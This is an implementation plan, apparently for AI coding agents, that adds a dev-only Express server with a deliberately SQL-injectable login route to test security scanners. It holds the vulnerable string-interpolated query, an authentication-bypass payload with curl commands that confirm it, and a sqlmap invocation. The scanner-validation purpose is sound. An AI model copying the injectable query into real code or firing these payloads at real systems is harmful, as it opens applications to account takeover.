# Vulnerable Dev Server Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a dev-only Express server on port 4001 with a deliberate SQL injection vulnerability on `POST /api/v1/auth/login` so external scanners (Burp, ZAP, sqlmap) can validate detection.

**Architecture:** A separate TypeScript entry point (`index.vuln.ts`) boots its own Express app that is identical to the production server except it mounts a vulnerable auth router (`routes/auth.vuln.ts`) in place of the secure one, and drops the rate limiter. The vulnerable login handler interpolates the `email` field directly into the SQL string instead of using a parameterized query. No existing files are modified.

**Tech Stack:** TypeScript, Express, node:sqlite `DatabaseSync`, bcryptjs. Build: `tsc` (existing tsconfig picks up all `src/**/*`).

---

## File Map

| File | Action | Responsibility |
|------|--------|----------------|
| `server/src/routes/auth.vuln.ts` | Create | Vulnerable login handler; delegates all other auth routes to the original secure router |
| `server/src/index.vuln.ts` | Create | Separate Express app on port 4001, no rate limiter, mounts `auth.vuln` router |
| `server/package.json` | Modify | Add `"start:vuln"` script |

---

## Task 1: Create the vulnerable auth router

**Files:**
- Create: `server/src/routes/auth.vuln.ts`

The router registers the vulnerable `POST /login` handler **first**, then delegates everything else (register, logout, me) to the original secure auth router. Express stops at the first matching route, so the original login inside the delegated router is never reached.

The vulnerability: `email` is interpolated directly into the SQL string. A payload like `' OR '1'='1' --` makes the query return the first user row (`seller@maison.test`). Because the seed password is `Password123!` for all users (exposed by `GET /api/v1/seed-info`), `bcrypt.compareSync("Password123!", hash)` succeeds and the scanner achieves authentication bypass.

A malformed payload like a bare `'` causes a SQLite syntax error → 500 response, which error-based scanners detect immediately.

- [ ] **Step 1: Create `server/src/routes/auth.vuln.ts`**

```typescript
import { Router } from 'express';
import bcrypt from 'bcryptjs';
import { db } from '../db.js';
import { signToken, fail } from '../auth.js';
import type { DbUser } from '../db.js';
import originalAuthRouter from './auth.js';

const router = Router();

const cookieOpts = {
  httpOnly: true,
  sameSite: 'lax',
  secure: false,
  maxAge: 2 * 60 * 60 * 1000,
} as const;

function publicUser(u: DbUser) {
  return {
    id: u.id,
    email: u.email,
    name: u.name,
    role: u.role,
    firstName: u.first_name ?? null,
    lastName: u.last_name ?? null,
    gender: u.gender ?? null,
    phone: u.phone ?? null,
    dateOfBirth: u.date_of_birth,
  };
}

// INTENTIONALLY VULNERABLE — dev security testing only.
// The email field is interpolated directly into the SQL string.
// Payload  : email = "' OR '1'='1' --", password = "Password123!"
// Effect   : query returns first seeded user; bcrypt passes → 200 + valid token.
// Detection: bare ' causes SQLite syntax error → 500 (error-based scanners).
router.post('/login', (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return fail(res, 400, 'MISSING_CREDENTIALS', 'Email and password are required.');
  }
  const user = db.prepare(
    `SELECT * FROM users WHERE email = '${email}'`
  ).get() as DbUser | undefined;
  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    return fail(res, 401, 'INVALID_CREDENTIALS', 'Email or password is incorrect.');
  }
  const token = signToken(user);
  res.cookie('maison_token', token, cookieOpts);
  return res.json({ token, user: publicUser(user) });
});

// All other auth routes (register, logout, me) are handled by the original secure router.
router.use(originalAuthRouter);

export default router;
```

- [ ] **Step 2: Build to check for TypeScript errors**

```bash
cd server && npm run build
```

Expected: clean build, no errors. New output files appear at `server/dist/routes/auth.vuln.js`.

- [ ] **Step 3: Commit**

```bash
git add server/src/routes/auth.vuln.ts server/dist/
git commit -m "feat(dev): add vulnerable login handler for security scanner validation"
```

---

## Task 2: Create the vulnerable server entry point

**Files:**
- Create: `server/src/index.vuln.ts`

This is a near-copy of `index.ts` with three changes: port (`PORT_VULN`, default 4001), auth router swapped to `auth.vuln`, and the rate-limiter block removed. A startup warning is printed so the operator knows they're running the vulnerable build.

- [ ] **Step 1: Create `server/src/index.vuln.ts`**

```typescript
import express from 'express';
import type { ErrorRequestHandler } from 'express';
import cookieParser from 'cookie-parser';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { seed, SEED_INFO } from './db.js';
import { authenticate, fail } from './auth.js';
import authVulnRoutes from './routes/auth.vuln.js';
import productRoutes from './routes/products.js';
import cartRoutes, { ordersRouter } from './routes/cart.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = Number(process.env.PORT_VULN || 4001);
const ORIGIN = `http://localhost:${PORT}`;

seed();

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '2mb' }));
app.use(cookieParser());

app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; script-src 'self'; connect-src 'self'; frame-ancestors 'none'"
  );
  next();
});

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', ORIGIN);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PATCH,PUT,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(authenticate);

const api = express.Router();
api.get('/health', (_req, res) => res.json({ status: 'ok', service: 'maison-vuln', time: new Date().toISOString() }));
api.get('/seed-info', (_req, res) => res.json(SEED_INFO));
api.post('/_reset', (req, res) => {
  if (process.env.MAISON_ALLOW_RESET === 'false') {
    return fail(res, 403, 'RESET_DISABLED', 'Reset endpoint is disabled.');
  }
  seed();
  res.json({ ok: true, reseeded: true });
});

// No rate limiter — scanners need unrestricted access to the auth endpoints.
api.use('/auth', authVulnRoutes);
api.use('/products', productRoutes);
api.use('/cart', cartRoutes);
api.use('/orders', ordersRouter);

app.use('/api/v1', api);
app.use('/api', (_req, res) => fail(res, 404, 'NOT_FOUND', 'Unknown API route.'));

const webDist = path.join(__dirname, '..', '..', 'web', 'dist');
app.use(express.static(webDist));
app.get('*', (_req, res) => {
  res.sendFile(path.join(webDist, 'index.html'));
});

const errorHandler: ErrorRequestHandler = (err, _req, res, _next) => { // eslint-disable-line @typescript-eslint/no-unused-vars
  const e = err as { type?: string } | null;
  if (e && e.type === 'entity.parse.failed') {
    return fail(res, 400, 'INVALID_JSON', 'Request body is not valid JSON.');
  }
  console.error('[maison-vuln] unexpected error:', err);
  return fail(res, 500, 'INTERNAL', 'An unexpected error occurred.');
};
app.use(errorHandler);

app.listen(PORT, () => {
  console.log('\n  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
  console.log('  !!  MAISON VULN SERVER -- DO NOT USE IN PRODUCTION  !!');
  console.log('  !!  Intentional SQL injection: POST /api/v1/auth/login  !!');
  console.log('  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
  console.log(`\n  Running at ${ORIGIN}`);
  console.log(`  API base:  ${ORIGIN}/api/v1`);
  console.log(`  Injection: POST ${ORIGIN}/api/v1/auth/login  (email field)\n`);
});
```

- [ ] **Step 2: Build**

```bash
cd server && npm run build
```

Expected: clean build. New output at `server/dist/index.vuln.js`.

- [ ] **Step 3: Commit**

```bash
git add server/src/index.vuln.ts server/dist/
git commit -m "feat(dev): add vulnerable server entry point on port 4001"
```

---

## Task 3: Add the `start:vuln` npm script

**Files:**
- Modify: `server/package.json` lines 7-10

- [ ] **Step 1: Add the script**

Edit `server/package.json`. Change the `"scripts"` block from:

```json
"scripts": {
  "build": "tsc",
  "start": "node dist/index.js",
  "dev": "tsc --watch"
},
```

To:

```json
"scripts": {
  "build": "tsc",
  "start": "node dist/index.js",
  "start:vuln": "node dist/index.vuln.js",
  "dev": "tsc --watch"
},
```

- [ ] **Step 2: Start the vuln server and verify**

```bash
cd server && npm run start:vuln
```

Expected console output:
```
  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  !!  MAISON VULN SERVER -- DO NOT USE IN PRODUCTION  !!
  !!  Intentional SQL injection: POST /api/v1/auth/login  !!
  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

  Running at http://localhost:4001
  API base:  http://localhost:4001/api/v1
  Injection: POST http://localhost:4001/api/v1/auth/login  (email field)
```

- [ ] **Step 3: Verify the injection is exploitable (auth bypass)**

In a separate terminal while the vuln server is running:

```bash
# Reset to known state
curl -s -X POST http://localhost:4001/api/v1/_reset | jq .

# Injection bypass — OR 1=1 returns the first seeded user (seller@maison.test)
# Seed password "Password123!" is returned by /seed-info and works for all seeded accounts
curl -s -X POST http://localhost:4001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'\'' OR '\''1'\''='\''1'\'' --", "password": "Password123!"}' | jq .
```

Expected: HTTP 200 with a `token` and `user` object for `seller@maison.test`. This confirms authentication bypass via SQL injection.

- [ ] **Step 4: Verify error-based detection (bare quote causes 500)**

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:4001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'\''", "password": "test"}'
```

Expected: `500`. The unmatched single quote causes a SQLite syntax error. This is what error-based scanners (Burp active scan, sqlmap default mode) detect first.

- [ ] **Step 5: Verify the production server is NOT vulnerable**

Start the safe server in another terminal (`cd server && npm start`), then:

```bash
curl -s -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'\'' OR '\''1'\''='\''1'\'' --", "password": "Password123!"}' | jq .
```

Expected: HTTP 401 `INVALID_CREDENTIALS`. Parameterized queries prevent injection.

- [ ] **Step 6: Commit**

```bash
git add server/package.json
git commit -m "feat(dev): add start:vuln script for security scanner target server"
```

---

## Scanner Quick-Start Reference

Once `npm run start:vuln` is running:

| Tool | Command |
|------|---------|
| sqlmap | `sqlmap -u http://localhost:4001/api/v1/auth/login --data='{"email":"*","password":"Password123!"}' --content-type=application/json --level=3` |
| Burp Suite | Point active scanner at `POST http://localhost:4001/api/v1/auth/login`, mark `email` as injection point |
| ZAP | Add `http://localhost:4001` as target, run active scan with `POST /api/v1/auth/login` in scope |
| Reset between runs | `curl -X POST http://localhost:4001/api/v1/_reset` |
